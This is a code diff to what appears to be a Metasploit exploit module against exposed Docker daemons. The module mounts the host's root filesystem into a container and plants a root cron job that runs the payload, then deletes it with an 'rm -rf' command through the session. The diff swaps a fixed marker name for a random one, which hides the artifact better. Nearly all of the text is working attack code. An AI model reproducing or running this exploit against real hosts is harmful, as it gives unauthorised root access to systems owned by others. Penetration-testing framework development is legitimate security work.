@@ -47,7 +47,7 @@ class MetasploitModule < Msf::Exploit::Remote
    def on_new_session(client)
      
      if client.type == "shell"
-          client.shell_write("rm -rf /etc/cron.d/MCTMP\n")
+          client.shell_write("rm -rf /etc/cron.d/#{@cron_name}\n")
      end
 
   end
@@ -91,13 +91,14 @@ class MetasploitModule < Msf::Exploit::Remote
   def exploit
 
    cli_loaded()
-   
+ 
+   @cron_name = rand_text_alpha_upper(6)  
    mc = "* * * * * root #{payload.raw}"
 
-   all = "sh -c \"echo '#{mc}' > /MCTMP/etc/cron.d/MCTMP\""
+   all = "sh -c \"echo '#{mc}' > /#{@cron_name}/etc/cron.d/#{@cron_name}\""
 
-   print_good("Mounting '#{datastore['IMAGEID']}'. Executing final payload...")
-   system("#{@dockercli} -H tcp://#{datastore['RHOSTS']}:#{datastore['RPORT']} run -it -v /:/MCTMP '#{datastore['IMAGEID']}' #{all}")
+   print_good("Mounting '#{datastore['IMAGEID']}'. Executing payload '/etc/cron.d/#{@cron_name}'...")
+   system("#{@dockercli} -H tcp://#{datastore['RHOSTS']}:#{datastore['RPORT']} run -it -v /:/#{@cron_name} '#{datastore['IMAGEID']}' #{all}")
    Rex.sleep(60)
    handler
 
